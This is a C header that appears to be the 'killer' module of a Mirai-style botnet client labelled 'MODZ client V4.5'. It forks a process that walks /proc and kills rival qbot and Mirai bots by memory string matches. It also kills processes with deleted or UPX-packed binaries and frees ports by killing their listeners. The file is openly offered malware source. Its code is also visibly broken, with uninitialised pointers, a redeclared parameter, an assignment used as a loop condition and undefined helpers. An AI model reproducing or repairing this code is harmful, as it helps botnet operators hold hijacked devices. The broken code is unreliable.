/*
███╗   ███╗ ██████╗ ██████╗ ███████╗
████╗ ████║██╔═══██╗██╔══██╗╚══███╔╝
██╔████╔██║██║   ██║██║  ██║  ███╔╝ 
██║╚██╔╝██║██║   ██║██║  ██║ ███╔╝  
██║ ╚═╝ ██║╚██████╔╝██████╔╝███████╗
╚═╝     ╚═╝ ╚═════╝ ╚═════╝ ╚══════╝ 


If you have this you are trusted. Please do not leak!
MODZ client V4.5

 __  _  __  _   _               
| |/ / (_) | | | |   ___   _ __ 
| ' /  | | | | | |  / _ \ | '__|
| . \  | | | | | | |  __/ | |   
|_|\_\ |_| |_| |_|  \___| |_|   
 


*/
#pragma once
#define TRUE 1
#define FALSE 0
#define MAX_PIDS 4096

#include <unistd.h>
#include <stdlib.h>
#include <arpa/inet.h>
#include <linux/limits.h>
#include <sys/types.h>
#include <dirent.h>
#include <signal.h>
#include <fcntl.h>
#include <time.h>
#include <limits.h>



int killer_pid;

static int mem_exists(char *buf, int buf_len, char *str, int str_len)
{
    int matches = 0;

    if (str_len > buf_len)
        return FALSE;

    while (buf_len--)
    {
        if (*buf++ == str[matches])
        {
            if (++matches == str_len)
                return TRUE;
        }
        else
            matches = 0;
    }

    return FALSE;
}

static int memory_scan_match(char *path)
{
    int fd, ret;
    char rdbuf[4096];
    char *m_qbot_route, *m_qbot_bogo, *m_mirai_watchdog, *m_mirai_watchdog2, *m_mirai_killtcp;
    int m_qbot_len, m_qbot2_len, m_mirai1_len, m_mirai2_len, m_mirai3_len;
    int found = FALSE;

    if ((fd = open(path, O_RDONLY)) == -1)
        return FALSE;

    m_qbot_route = "/proc/net/route";
    m_qbot_bogo = "BOGOMIPS";
    m_mirai_watchdog = "/dev/watchdog/";
	m_mirai_watchdog2 = "/dev/misc/watchdog/";
	m_mirai_killtcp = "/proc/net/tcp";

	m_qbot_len = strlen(m_qbot_route);
	m_qbot2_len = strlen(m_qbot_bogo);
	m_mirai1_len = strlen(m_mirai_watchdog);
	m_mirai2_len = strlen(m_mirai_watchdog2);
	m_mirai3_len = strlen(m_mirai_killtcp);

    while ((ret = read(fd, rdbuf, sizeof (rdbuf))) > 0)
    {
        if (mem_exists(rdbuf, ret, m_qbot_route, m_qbot_len) ||
            mem_exists(rdbuf, ret, m_qbot_bogo, m_qbot2_len) ||
            mem_exists(rdbuf, ret, m_mirai_watchdog, m_mirai1_len) ||
			mem_exists(rdbuf, ret, m_mirai_watchdog2, m_mirai2_len) ||
			mem_exists(rdbuf, ret, m_mirai_killtcp, m_mirai3_len))
        {
            found = TRUE;
            break;
        }
    }

    close(fd);

    return found;
}

static int has_access(char *path)
{
    char path[PATH_MAX], *ptr_path = path, tmp[16];
    int fd, k_rp_len;
    char *tmp_pid;
    int pid = getpid();
	sprintf(tmp_pid, "%d", pid);
    strcpy(ptr_path + strlen(ptr_path), (char *)"/proc/");
    strcpy(ptr_path + strlen(ptr_path), (char *)tmp_pid);
    strcpy(ptr_path + strlen(ptr_path), (char *)"/");
	strcpy(ptr_path + strlen(ptr_path), (char *)path);

    if ((fd = open(path, O_RDONLY)) == -1)
    {
        return FALSE;
    }
    close(fd);

    if ((k_rp_len = readlink(path, killer_realpath, PATH_MAX - 1)) != -1)
    {
        killer_realpath[k_rp_len] = 0;
    }

    zero(path, ptr_path - path);

    return TRUE;
}

int killer_kill_by_port(uint16_t port)
{
    DIR *dir, *fd_dir;
    struct dirent *entry, *fd_entry;
    char path[PATH_MAX] = {0}, exe[PATH_MAX] = {0}, buffer[512] = {0};
    int pid = 0, fd = 0;
    char inode[16] = {0};
    char *ptr_path = path;
    int ret = 0;
    char port_str[16];


    util_itoa(ntohs(port), 16, port_str);
    if (strlen(port_str) == 2)
    {
        port_str[2] = port_str[0];
        port_str[3] = port_str[1];
        port_str[4] = 0;

        port_str[0] = '0';
        port_str[1] = '0';
    }

    fd = open("/proc/net/tcp", O_RDONLY);
    if (fd == -1)
        return 0;

    while(m_fdgets(buffer, 512, fd) != NULL)
    {
        int i = 0, ii = 0;

        while (buffer[i] != 0 && buffer[i] != ':')
            i++;

        if (buffer[i] == 0) continue;
        i += 2;
        ii = i;

        while (buffer[i] != 0 && buffer[i] != ' ')
            i++;
        buffer[i++] = 0;

        if (stristr(&(buffer[ii]), strlen(&(buffer[ii])), port_str) != -1)
        {
            int column_index = 0;
            int in_column = FALSE;
            int listening_state = FALSE;

            while (column_index < 7 && buffer[++i] != 0)
            {
                if (buffer[i] == ' ' || buffer[i] == '\t')
                    in_column = TRUE;
                else
                {
                    if (in_column == TRUE)
                        column_index++;

                    if (in_column == TRUE && column_index == 1 && buffer[i + 1] == 'A')
                    {
                        listening_state = TRUE;
                    }

                    in_column = FALSE;
                }
            }
            ii = i;

            if (listening_state == FALSE)
                continue;

            while (buffer[i] != 0 && buffer[i] != ' ')
                i++;
            buffer[i++] = 0;

            if (strlen(&(buffer[ii])) > 15)
                continue;

            strcpy(inode, &(buffer[ii]));
            break;
        }
    }
    close(fd);

    if (strlen(inode) == 0)
    {
        return 0;
    }


    if ((dir = opendir("/proc/")) != NULL)
    {
        while ((entry = readdir(dir)) != NULL && ret == 0)
        {
            char *pid = entry->d_name;

            if (*pid < '0' || *pid > '9')
                continue;

            strcpy(ptr_path, "/proc/");
            strcpy(ptr_path + strlen(ptr_path), pid);
            strcpy(ptr_path + strlen(ptr_path), "/exe");

            if (readlink(path, exe, PATH_MAX) == -1)
                continue;

            strcpy(ptr_path, "/proc/");
            strcpy(ptr_path + strlen(ptr_path), pid);
            strcpy(ptr_path + strlen(ptr_path), "/fd");
            if ((fd_dir = opendir(path)) != NULL)
            {
                while ((fd_entry = readdir(fd_dir)) != NULL && ret == 0)
                {
                    char *fd_str = fd_entry->d_name;

                    zero(exe, PATH_MAX);
                    strcpy(ptr_path, "/proc/");
                    strcpy(ptr_path + strlen(ptr_path), pid);
                    strcpy(ptr_path + strlen(ptr_path), "/fd");
                    strcpy(ptr_path + strlen(ptr_path), "/");
                    strcpy(ptr_path + strlen(ptr_path), fd_str);
                    if (readlink(path, exe, PATH_MAX) == -1)
                        continue;

                    if (stristr(exe, strlen(exe), inode) != -1)
                    {
                        kill(util_atoi(pid, 10), 9);
                        ret = 1;
                    }
                }
                closedir(fd_dir);
            }
        }
        closedir(dir);
    }

    sleep(1);

    return ret;
}

void killer_init(void) {
	
	DIR *dir;
    struct dirent *file;
	char pids[MAX_PIDS];
	int pid_num;
	
    killer_pid = fork();
    if(killer_pid > 0 || killer_pid == -1)
        return;

    if(!has_access("exe"))
        return;
    while(1) {
        if((dir = opendir("/proc/")) == NULL)
            break;
   
        while((file = readdir(dir)) != NULL) {
	    	if(*(file->d_name) < '0' || *(file->d_name) > '9')
				continue;
			int ipid = atoi(file->d_name);
			if(!(ipid == getpid()) || !(ipid == getppid())) {
				#ifdef DEBUG
				printf("[killer] Found Pid <%d>\n", ipid);
				#endif
				unsigned char *pid = file->d_name;
				strcpy(pids[pid_num], pid);
				if(pid_num == MAX_PIDS)
					break;
				pid_num++;
			}
	    }
		for(int i = 0; i = pid_num; i = i + 1) {
			char *path;
			char rp[PATH_MAX];
			int rp_len, fd;
			sprintf(path, "/proc/%s/exe", pids[i]);
			if((rp_len = readlink(path, rp, sizeof(rp) - 1)) != -1) {
                rp[rp_len] = 0;

                if ((fd = open(rp, O_RDONLY)) == -1) {
					#ifdef DEBUG
					printf("[killer] Killing PID%s (Deleted Binary)\n", pids[i]);
					#endif
                    kill(pids[i], 9);
                }
                close(fd);
            }
			
			if(memory_scan_match(path)) {
                #ifdef DEBUG
                printf("[killer] Killing PID%s (Mem Match EXE)\n", pids[i]);
                #endif
                kill(pids[i], 9);
            }
			int ret;
            char rdbuf[4096];
			if((fd = open(path, O_RDONLY)) != -1)
                continue;
			char *str_upx;
			sprintf(str_upx, "UPX!");
			while((ret = read(fd, rdbuf, sizeof (rdbuf))) > 0) {
				
                if(mem_exists(rdbuf, ret, str_upx, str_upx_len)) {
					#ifdef DEBUG
				    printf("[killer] Killing PID%s (Mem Match UPX)\n", pids[i]);
					#endif
					kill(pids[i], 9);
				}
			}
		}
	}
}

void killer_kill(void) {
    kill(killer_pid, 9);
}
